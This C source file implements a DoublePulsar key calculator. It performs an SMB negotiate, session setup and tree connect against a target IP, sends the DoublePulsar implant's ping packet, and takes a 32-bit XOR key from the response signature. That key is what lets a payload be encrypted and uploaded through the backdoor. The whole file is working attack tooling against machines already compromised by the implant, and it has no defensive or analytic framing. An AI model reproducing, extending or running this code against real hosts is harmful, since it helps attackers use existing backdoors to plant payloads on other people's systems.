#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET sock;
    uint8_t user_id[2] = {0, 0};
    uint8_t tree_id[2] = {0, 0};
    uint32_t xor_key = 0;
    int stage;
    int result = -1;

    if (ip == NULL || port <= 0 || port > 65535)
        return 0;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    for (stage = 0; stage < 4; ++stage) {
        const uint8_t *packet_source = NULL;
        size_t packet_size = 0;
        uint8_t *packet = NULL;
        uint8_t header[4];
        uint8_t *response = NULL;
        size_t response_size;
        size_t sent = 0;
        size_t received = 0;
        uint32_t body_size;
        size_t i;

        switch (stage) {
        case 0:
            packet_source = SMB_NEGOTIATE_PKT;
            packet_size = sizeof(SMB_NEGOTIATE_PKT);
            break;
        case 1:
            packet_source = SMB_SESSION_SETUP_PKT;
            packet_size = sizeof(SMB_SESSION_SETUP_PKT);
            break;
        case 2:
            packet_source = SMB_TREE_CONNECT_PKT;
            packet_size = sizeof(SMB_TREE_CONNECT_PKT);
            break;
        default:
            packet_source = DP_PING_PKT;
            packet_size = sizeof(DP_PING_PKT);
            break;
        }

        if (packet_size <= 1)
            goto cleanup;

        packet = (uint8_t *)malloc(packet_size);
        if (packet == NULL)
            goto cleanup;
        memcpy(packet, packet_source, packet_size);

        if (stage == 2) {
            if (packet_size < 34) {
                free(packet);
                goto cleanup;
            }
            packet[32] = user_id[0];
            packet[33] = user_id[1];
        } else if (stage == 3) {
            if (packet_size < 34) {
                free(packet);
                goto cleanup;
            }
            packet[28] = tree_id[0];
            packet[29] = tree_id[1];
            packet[32] = user_id[0];
            packet[33] = user_id[1];
        }

        while (sent < packet_size - 1) {
            size_t remaining = packet_size - 1 - sent;
            int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
            int count = send(sock, (const char *)packet + sent, chunk, 0);
            if (count == SOCKET_ERROR || count == 0) {
                free(packet);
                goto cleanup;
            }
            sent += (size_t)count;
        }
        free(packet);

        while (received < sizeof(header)) {
            int count = recv(sock, (char *)header + received,
                             (int)(sizeof(header) - received), 0);
            if (count == SOCKET_ERROR || count == 0)
                goto cleanup;
            received += (size_t)count;
        }

        body_size = ((uint32_t)header[1] << 16) |
                    ((uint32_t)header[2] << 8) |
                    (uint32_t)header[3];
        if (body_size == 0 || body_size > SIZE_MAX - sizeof(header))
            goto cleanup;

        response_size = sizeof(header) + (size_t)body_size;
        response = (uint8_t *)malloc(response_size);
        if (response == NULL)
            goto cleanup;
        memcpy(response, header, sizeof(header));

        received = 0;
        while (received < (size_t)body_size) {
            size_t remaining = (size_t)body_size - received;
            int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
            int count = recv(sock, (char *)response + sizeof(header) + received,
                             chunk, 0);
            if (count == SOCKET_ERROR || count == 0) {
                free(response);
                goto cleanup;
            }
            received += (size_t)count;
        }

        if (stage == 1) {
            if (response_size < 34) {
                free(response);
                goto cleanup;
            }
            user_id[0] = response[32];
            user_id[1] = response[33];
        } else if (stage == 2) {
            if (response_size < 34) {
                free(response);
                goto cleanup;
            }
            tree_id[0] = response[28];
            tree_id[1] = response[29];
            user_id[0] = response[32];
            user_id[1] = response[33];
        } else if (stage == 3) {
            if ((size_t)SMB_RESP_SIGNATURE_END < (size_t)SMB_RESP_SIGNATURE_START ||
                (size_t)SMB_RESP_SIGNATURE_END - (size_t)SMB_RESP_SIGNATURE_START != 4 ||
                response_size < (size_t)SMB_RESP_SIGNATURE_END) {
                free(response);
                goto cleanup;
            }
            for (i = 0; i < 4; ++i) {
                xor_key |= (uint32_t)response[(size_t)SMB_RESP_SIGNATURE_START + i]
                           << (8u * (unsigned int)i);
            }
            free(response);
            result = 0;
            goto cleanup;
        }

        free(response);
    }

cleanup:
    closesocket(sock);
    return result == 0 ? (unsigned int)xor_key : 0;
}